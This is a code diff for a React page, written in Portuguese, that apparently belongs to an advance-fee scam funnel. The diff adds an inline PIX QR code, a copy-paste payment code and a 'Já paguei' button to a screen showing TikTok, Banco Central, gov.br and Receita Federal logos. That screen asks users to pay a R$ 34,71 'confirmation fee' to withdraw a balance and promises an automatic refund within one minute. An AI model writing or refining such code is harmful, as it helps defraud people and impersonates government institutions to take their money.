@@ -1,9 +1,12 @@
-import { useState } from "react";
-import { Check, Loader2, ShieldCheck, ChevronDown } from "lucide-react";
+import { useState, useEffect, useRef } from "react";
+import { Check, Loader2, ShieldCheck, ChevronDown, Copy, CheckCircle2, Clock } from "lucide-react";
+import { QRCodeSVG } from "qrcode.react";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import bacenLogo from "@/assets/bacen-logo.png";
 import govbrLogo from "@/assets/govbr-logo.webp";
 import receitaFederalLogo from "@/assets/receita-federal-logo.png";
+import pixLogoFull from "@/assets/pix-logo-full.svg";
+import { PixPaymentData } from "./types";
 
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
   const [open, setOpen] = useState(false);
@@ -30,17 +33,38 @@ interface FunnelConfirmTaxProps {
   taxDiscount?: string;
   leadCpf?: string;
   leadName?: string;
+  pixData?: PixPaymentData | null;
+  onCopyPix?: () => void;
+  isPixCopied?: boolean;
+  onManualCheck?: () => void;
+  isCheckingPayment?: boolean;
+  checkError?: string | null;
 }
 
 const FunnelConfirmTax = ({
   balance, pixKey, pixKeyType = "E-mail", pixName, onGeneratePix, isGenerating,
   taxAmount = "R$ 34,71", taxAnchor = "R$ 89,90", taxDiscount = "61% OFF", leadCpf, leadName,
+  pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError,
 }: FunnelConfirmTaxProps) => {
+  const pixSectionRef = useRef<HTMLDivElement>(null);
+  const hasScrolledRef = useRef(false);
+
   const maskCpf = (cpf: string) => {
     const digits = cpf.replace(/\D/g, '');
     if (digits.length >= 11) return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
     return cpf;
   };
+
+  useEffect(() => {
+    if (pixData?.pix_code && pixSectionRef.current && !hasScrolledRef.current) {
+      hasScrolledRef.current = true;
+      setTimeout(() => {
+        pixSectionRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }, 300);
+    }
+  }, [pixData?.pix_code]);
+
+  const showPixInline = !!pixData?.pix_code;
 
   return (
     <div className="fixed inset-0 z-[80] bg-[#F8F8F8] overflow-y-auto">
@@ -90,31 +114,115 @@ const FunnelConfirmTax = ({
           </div>
         </div>
 
-        <div className="bg-white rounded-xl p-4 border border-gray-100">
-          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-4">PROCESSO DE LIBERAÇÃO</p>
-          <div className="space-y-4">
-            <div className="flex items-start gap-3">
-              <div className="w-7 h-7 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-[#E57373] text-xs font-semibold">1</span></div>
-              <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Pagar taxa de confirmação</p><p className="text-gray-400 text-[11px] mt-0.5">{taxAmount} para verificação de identidade</p></div>
-            </div>
-            <div className="flex items-start gap-3">
-              <div className="w-7 h-7 rounded-full bg-[#E8F5E9] flex items-center justify-center shrink-0"><Check className="w-3.5 h-3.5 text-[#4CAF50]" /></div>
-              <div className="pt-0.5"><p className="text-[#4CAF50] text-[13px] font-semibold leading-tight">Receber reembolso automático</p><p className="text-gray-400 text-[11px] mt-0.5">Valor devolvido em 1 minuto</p></div>
-            </div>
-            <div className="flex items-start gap-3">
-              <div className="w-7 h-7 rounded-full bg-gray-100 flex items-center justify-center shrink-0"><span className="text-gray-400 text-xs font-semibold">3</span></div>
-              <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Acessar saldo completo</p><p className="text-gray-400 text-[11px] mt-0.5">{balance} liberado para saque</p></div>
+        {!showPixInline && (
+          <div className="bg-white rounded-xl p-4 border border-gray-100">
+            <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-4">PROCESSO DE LIBERAÇÃO</p>
+            <div className="space-y-4">
+              <div className="flex items-start gap-3">
+                <div className="w-7 h-7 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-[#E57373] text-xs font-semibold">1</span></div>
+                <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Pagar taxa de confirmação</p><p className="text-gray-400 text-[11px] mt-0.5">{taxAmount} para verificação de identidade</p></div>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className="w-7 h-7 rounded-full bg-[#E8F5E9] flex items-center justify-center shrink-0"><Check className="w-3.5 h-3.5 text-[#4CAF50]" /></div>
+                <div className="pt-0.5"><p className="text-[#4CAF50] text-[13px] font-semibold leading-tight">Receber reembolso automático</p><p className="text-gray-400 text-[11px] mt-0.5">Valor devolvido em 1 minuto</p></div>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className="w-7 h-7 rounded-full bg-gray-100 flex items-center justify-center shrink-0"><span className="text-gray-400 text-xs font-semibold">3</span></div>
+                <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Acessar saldo completo</p><p className="text-gray-400 text-[11px] mt-0.5">{balance} liberado para saque</p></div>
+              </div>
             </div>
           </div>
-        </div>
+        )}
 
         <button
           onClick={onGeneratePix}
-          disabled={isGenerating}
-          className="w-full bg-[#00A651] text-white font-bold text-base py-4 rounded-xl flex items-center justify-center gap-2 shadow-lg shadow-green-500/40 active:scale-95 transition-transform animate-[pulse_2s_cubic-bezier(0.4,0,0.6,1)_infinite]"
+          disabled={isGenerating || showPixInline}
+          className={`w-full font-bold text-base py-4 rounded-xl flex items-center justify-center gap-2 transition-all active:scale-95 ${
+            showPixInline
+              ? 'bg-gray-300 text-gray-500 cursor-not-allowed shadow-none'
+              : 'bg-[#00A651] text-white shadow-lg shadow-green-500/40 animate-[pulse_2s_cubic-bezier(0.4,0,0.6,1)_infinite]'
+          }`}
         >
-          {isGenerating ? <Loader2 className="w-5 h-5 animate-spin" /> : "LIBERAR SAQUE"}
+          {isGenerating ? <Loader2 className="w-5 h-5 animate-spin" /> : showPixInline ? "✓ PIX gerado abaixo" : "LIBERAR SAQUE"}
         </button>
+
+        {/* ─── Seção PIX Inline ─── */}
+        {showPixInline && pixData && (
+          <div ref={pixSectionRef} className="bg-white rounded-xl border-2 border-[#E8505B] overflow-hidden">
+            <div className="bg-gradient-to-r from-[#E8505B] to-[#D32F2F] px-4 py-2.5 flex items-center justify-between">
+              <img src={pixLogoFull} alt="PIX" className="h-5 brightness-0 invert" />
+              <span className="text-white/90 text-[11px] font-medium">Pagamento via PIX</span>
+            </div>
+
+            <div className="p-4 space-y-3">
+              <div className="bg-gray-50 rounded-lg p-2.5">
+                <div className="flex items-center gap-2.5 justify-center">
+                  {[{ n: "1", t: "Abra seu banco" }, { n: "2", t: "PIX Copia e Cola" }, { n: "3", t: "Cole e pague" }].map(s => (
+                    <div key={s.n} className="flex items-center gap-1">
+                      <div className="w-5 h-5 rounded-full bg-[#E8505B] flex items-center justify-center shrink-0"><span className="text-white text-[9px] font-bold">{s.n}</span></div>
+                      <p className="text-gray-600 text-[10px]">{s.t}</p>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              <div className="text-center">
+                <div className="w-40 h-40 mx-auto mb-2 bg-white p-2 border-2 border-gray-200 rounded-xl flex items-center justify-center shadow-sm">
+                  <QRCodeSVG value={pixData.pix_code!} size={144} level="M" />
+                </div>
+                <p className="text-xl font-bold text-gray-800">{taxAmount}</p>
+                <p className="text-gray-400 text-xs">Taxa de Confirmação</p>
+              </div>
+
+              <div className="bg-amber-50 border border-amber-200 rounded-lg p-2.5 flex items-center justify-center gap-2">
+                <div className="w-2 h-2 bg-amber-500 animate-pulse rounded-full" />
+                <span className="text-amber-700 text-xs font-medium">Aguardando pagamento...</span>
+              </div>
+
+              <div className="bg-gray-50 rounded-lg p-2.5">
+                <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-1.5">CÓDIGO PIX COPIA E COLA</p>
+                <p className="text-gray-600 text-[9px] break-all font-mono leading-relaxed">{pixData.pix_code}</p>
+              </div>
+
+              <button
+                onClick={onCopyPix}
+                className={`w-full py-3.5 rounded-xl text-white font-bold text-sm transition-all active:scale-[0.98] flex items-center justify-center gap-2 shadow-lg ${
+                  isPixCopied ? 'bg-[#2A9D5C]' : 'bg-[#E8505B] hover:brightness-105 animate-[pulse_2s_cubic-bezier(0.4,0,0.6,1)_infinite]'
+                }`}
+              >
+                {isPixCopied ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                {isPixCopied ? '✓ Código copiado! Cole no seu banco' : 'Copiar código PIX'}
+              </button>
+
+              {isPixCopied && (
+                <div className="bg-blue-50 border border-blue-200 rounded-lg p-2.5 text-center -mt-1">
+                  <p className="text-blue-700 text-[11px] font-medium">📋 Agora abra o app do seu banco → PIX → Pix Copia e Cola → Cole o código</p>
+                </div>
+              )}
+
+              {onManualCheck && (
+                <button
+                  onClick={onManualCheck}
+                  disabled={isCheckingPayment}
+                  className="w-full py-3 rounded-xl bg-[#2A9D5C] text-white font-semibold text-sm hover:brightness-105 transition-all active:scale-[0.98] flex items-center justify-center gap-2 disabled:opacity-70"
+                >
+                  {isCheckingPayment ? (<><Loader2 className="w-4 h-4 animate-spin" />Verificando...</>) : (<><CheckCircle2 className="w-4 h-4" />Já paguei</>)}
+                </button>
+              )}
+
+              {checkError && (
+                <div className="bg-red-50 border border-red-200 rounded-lg p-2.5 text-center">
+                  <span className="text-red-600 text-xs">{checkError}</span>
+                </div>
+              )}
+
+              <div className="flex items-center justify-center gap-2 pt-1">
+                <Clock className="w-3.5 h-3.5 text-[#4CAF50]" />
+                <span className="text-[#4CAF50] text-[11px] font-medium">Reembolso automático em 1 minuto</span>
+              </div>
+            </div>
+          </div>
+        )}
 
         <div className="bg-white rounded-xl p-4 border border-gray-100">
           <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">PERGUNTAS FREQUENTES</p>
